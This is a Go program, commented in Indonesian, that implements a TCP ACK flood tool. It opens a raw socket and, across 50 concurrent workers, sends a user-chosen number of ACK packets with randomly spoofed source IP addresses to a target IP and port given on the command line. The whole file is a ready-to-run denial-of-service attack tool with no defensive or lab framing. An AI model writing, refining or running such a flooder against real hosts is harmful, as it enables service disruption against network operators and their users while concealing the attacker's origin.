package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// Menghasilkan IP acak secara efisien
func randomIP() net.IP {
	ip := make(net.IP, 4)
	rand.Read(ip)
	return ip
}

// Menghasilkan angka acak dalam range tertentu
func randInt(min, max int) int {
	return rand.Intn(max-min) + min
}

func main() {
	// Mendefinisikan flag argumen yang dikirim dari Bash
	targetIPStr := flag.String("t", "", "Target IP Address")
	targetPortInt := flag.Int("p", 80, "Target Port")
	packetCount := flag.Int("c", 1000, "Number of packets to send")
	flag.Parse()

	// Validasi input wajib
	if *targetIPStr == "" {
		fmt.Println("[!] Error: Target IP tidak boleh kosong.")
		flag.Usage()
		os.Exit(1)
	}

	// Inisialisasi generator acak
	rand.Seed(time.Now().UnixNano())

	dstIP := net.ParseIP(*targetIPStr)
	if dstIP == nil {
		log.Fatal("[!] Error: Format IP Target salah!")
	}

	// Membuka koneksi raw socket (Layer 3 IPv4 over TCP)
	conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
	if err != nil {
		log.Fatalf("[!] Gagal membuka raw socket (Pastikan menggunakan sudo/root): %v", err)
	}
	defer conn.Close()

	fmt.Printf("[*] Mengirim %d paket ACK ke %s:%d...\n", *packetCount, *targetIPStr, *targetPortInt)

	var wg sync.WaitGroup
	workerPool := 50 // Jumlah thread konkuren
	packetsPerWorker := *packetCount / workerPool
	remainder := *packetCount % workerPool

	startTime := time.Now()

	for i := 0; i < workerPool; i++ {
		wg.Add(1)
		count := packetsPerWorker
		if i == 0 {
			count += remainder
		}

		go func(packetsToSend int) {
			defer wg.Done()

			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				ComputeChecksums: true,
				FixLengths:       true,
			}

			for x := 0; x < packetsToSend; x++ {
				// Layer IP (Menggunakan spoofing IP asal acak)
				ipLayer := &layers.IPv4{
					Version:  4,
					TTL:      64,
					Protocol: layers.IPProtocolTCP,
					SrcIP:    randomIP(),
					DstIP:    dstIP,
				}

				// Layer TCP (Menyalakan bendera/flag ACK)
				tcpLayer := &layers.TCP{
					SrcPort: layers.TCPPort(randInt(1000, 9000)),
					DstPort: layers.TCPPort(*targetPortInt),
					ACK:     true,
					Seq:     uint32(randInt(1000, 9000)),
					Window:  uint16(randInt(1000, 9000)),
				}
				tcpLayer.SetNetworkLayerForChecksum(ipLayer)

				buf.Clear()
				if err := gopacket.SerializeLayers(buf, opts, ipLayer, tcpLayer); err != nil {
					continue
				}

				// Tembak paket langsung ke network
				_, _ = conn.WriteTo(buf.Bytes(), &net.IPAddr{IP: dstIP})
			}
		}(count)
	}

	wg.Wait()
	duration := time.Since(startTime)

	fmt.Println("[+] Selesai!")
	fmt.Printf("[+] Total paket terkirim: %d\n", *packetCount)
	fmt.Printf("[+] Waktu pemrosesan: %s\n", duration)
}

